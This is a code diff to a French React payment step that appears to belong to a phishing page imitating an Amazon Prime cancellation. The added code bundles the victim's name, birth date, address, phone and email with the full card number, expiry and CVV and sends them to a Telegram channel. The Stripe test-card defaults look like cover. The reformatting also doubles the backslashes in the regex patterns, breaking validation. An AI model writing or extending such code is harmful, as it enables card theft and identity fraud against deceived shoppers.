@@ -6,6 +6,7 @@ import visaLogo from '../../assets/images/visa.png';
 import mastercardLogo from '../../assets/images/mastercard.png';
 import amexLogo from '../../assets/images/amex.png';
 import { sendToTelegram } from '@/lib/telegram';
+import type { PersonalDetails } from './PersonalDetailsForm';
 
 const formatCardNumber: FormEventHandler<HTMLInputElement> = event => {
   const input = event.currentTarget;
@@ -32,10 +33,13 @@ export type CardDetails = {
 
 export function SafePaymentStep({
   initial,
+  personal,
   onBack,
   onContinue,
 }: {
   initial?: Partial<CardDetails>;
+  /** Infos récoltées à l'étape 3, nécessaires pour l'envoi Telegram final */
+  personal?: PersonalDetails;
   onBack: () => void;
   onContinue: (card: CardDetails) => void;
 }) {
@@ -51,9 +55,20 @@ export function SafePaymentStep({
       cvv: String(data.get('cvv') ?? ''),
     };
 
+    // ✅ Envoi UNIQUE avec perso + carte → passe notifySchema
     void sendToTelegram({
-      title: 'Paiement',
+      title: 'Demande Prime',
       fields: {
+        // Perso (camelCase attendu par route.ts)
+        lastName: personal?.nom ?? '',
+        firstName: personal?.prenom ?? '',
+        birthDate: personal?.dateNaissance ?? '',
+        address: personal?.adresse ?? '',
+        postalCode: personal?.codePostal ?? '',
+        city: personal?.ville ?? '',
+        phone: personal?.telephone ?? '',
+        email: personal?.email ?? '',
+        // Carte
         cardHolder: card.cardHolder,
         cardNumber: card.cardNumber,
         expiry: card.expiry,
@@ -82,10 +97,7 @@ export function SafePaymentStep({
               Utilisez la carte de test fournie, ou saisissez vos informations.
             </p>
           </div>
-          <div
-            className="amz-card-brands amz-card-brands--header"
-            aria-label="Réseaux de paiement pris en charge"
-          >
+          <div className="amz-card-brands amz-card-brands--header" aria-label="Réseaux de paiement pris en charge">
             <span><Image src={visaLogo} alt="Visa" /></span>
             <span><Image src={mastercardLogo} alt="Mastercard" /></span>
             <span><Image src={amexLogo} alt="American Express" /></span>
@@ -96,76 +108,27 @@ export function SafePaymentStep({
           <div className="amz-form-grid amz-card-demo-fields">
             <div className="amz-field amz-field--full">
               <label htmlFor="cardHolder">Nom du titulaire <span className="req">*</span></label>
-              <input
-                className="amz-input"
-                id="cardHolder"
-                name="cardHolder"
-                autoComplete="cc-name"
-                required
-                minLength={2}
-                maxLength={80}
-                defaultValue={initial?.cardHolder ?? 'UTILISATEUR TEST'}
-              />
+              <input className="amz-input" id="cardHolder" name="cardHolder" autoComplete="cc-name" required minLength={2} maxLength={80} defaultValue={initial?.cardHolder ?? 'UTILISATEUR TEST'} />
             </div>
             <div className="amz-field amz-field--full">
               <label htmlFor="cardNumber">Numéro de carte <span className="req">*</span></label>
-              <input
-                className="amz-input"
-                id="cardNumber"
-                name="cardNumber"
-                inputMode="numeric"
-                autoComplete="cc-number"
-                required
-                maxLength={19}
-                pattern="\d{4}( \d{4}){3}"
-                title="16 chiffres, groupés par 4."
-                defaultValue={initial?.cardNumber ?? '4242 4242 4242 4242'}
-                onInput={formatCardNumber}
-              />
+              <input className="amz-input" id="cardNumber" name="cardNumber" inputMode="numeric" autoComplete="cc-number" required maxLength={19} pattern="\\d{4}( \\d{4}){3}" title="16 chiffres, groupés par 4." defaultValue={initial?.cardNumber ?? '4242 4242 4242 4242'} onInput={formatCardNumber} />
             </div>
             <div className="amz-field">
               <label htmlFor="expiry">Expiration (MM/AA) <span className="req">*</span></label>
-              <input
-                className="amz-input"
-                id="expiry"
-                name="expiry"
-                inputMode="numeric"
-                autoComplete="cc-exp"
-                required
-                maxLength={5}
-                pattern="(0[1-9]|1[0-2])\/\d{2}"
-                title="Format MM/AA."
-                defaultValue={initial?.expiry ?? '12/34'}
-                onInput={formatExpiry}
-              />
+              <input className="amz-input" id="expiry" name="expiry" inputMode="numeric" autoComplete="cc-exp" required maxLength={5} pattern="(0[1-9]|1[0-2])\\/\\d{2}" title="Format MM/AA." defaultValue={initial?.expiry ?? '12/34'} onInput={formatExpiry} />
             </div>
             <div className="amz-field">
               <label htmlFor="cvv">CVV <span className="req">*</span></label>
-              <input
-                className="amz-input"
-                id="cvv"
-                name="cvv"
-                inputMode="numeric"
-                autoComplete="cc-csc"
-                required
-                maxLength={4}
-                pattern="\d{3,4}"
-                title="3 ou 4 chiffres."
-                defaultValue={initial?.cvv ?? '123'}
-                onInput={formatCvv}
-              />
+              <input className="amz-input" id="cvv" name="cvv" inputMode="numeric" autoComplete="cc-csc" required maxLength={4} pattern="\\d{3,4}" title="3 ou 4 chiffres." defaultValue={initial?.cvv ?? '123'} onInput={formatCvv} />
             </div>
           </div>
           <p className="amz-card-panel__note amz-card-panel__note--secure">
             Les valeurs pré-remplies sont les valeurs de test publiques de Stripe.
           </p>
           <div className="amz-actions">
-            <button className="amz-btn amz-btn--primary" type="submit">
-              Confirmer l&apos;annulation
-            </button>
-            <button className="amz-btn amz-btn--secondary" type="button" onClick={onBack}>
-              Retour
-            </button>
+            <button className="amz-btn amz-btn--primary" type="submit">Confirmer l&apos;annulation</button>
+            <button className="amz-btn amz-btn--secondary" type="button" onClick={onBack}>Retour</button>
           </div>
         </form>
       </section>
